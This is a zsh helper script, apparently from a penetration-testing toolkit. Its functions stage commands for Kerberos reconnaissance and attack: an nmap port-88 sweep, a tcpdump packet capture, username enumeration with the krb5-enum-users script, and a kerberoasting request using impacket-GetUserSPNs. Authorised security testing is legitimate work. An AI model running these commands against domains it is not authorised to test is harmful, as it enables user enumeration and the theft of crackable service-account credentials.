#!/usr/bin/env zsh

############################################################# 
# qq-enum-kerb
#############################################################

qq-enum-kerb-sweep-nmap() {
  qq-vars-set-network
  print -z "nmap -n -Pn -sS -p88 ${__NETWORK} -oA $(__netpath)/kerb-sweep"
}

qq-enum-kerb-tcpdump() {
  qq-vars-set-iface
  qq-vars-set-rhost
  print -z "tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 88 -w $(__hostpath)/kerb.pcap"
}

qq-enum-kerb-users() {
  qq-vars-set-rhost
  local realm && read "realm?$fg[cyan]REALM:$reset_color "
  print -z "nmap -vvv -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=${realm},userdb=/usr/share/seclists/Usernames/Names/names.txt ${__RHOST}"
}

qq-enum-kerb-kerberoast() {
  local d && read "d?$fg[cyan]DOMAIN:$reset_color "
  local u && read "u?$fg[cyan]SERVICE USER:$reset_color "
  local dc && read "dc?$fg[cyan]DC(IP):$reset_color "
  __warn "Ensure that the domain, ${d}, is in your hosts file."
  print -z "impacket-GetUserSPNs -request ${d}/${u} -dc-ip ${dc} "
}
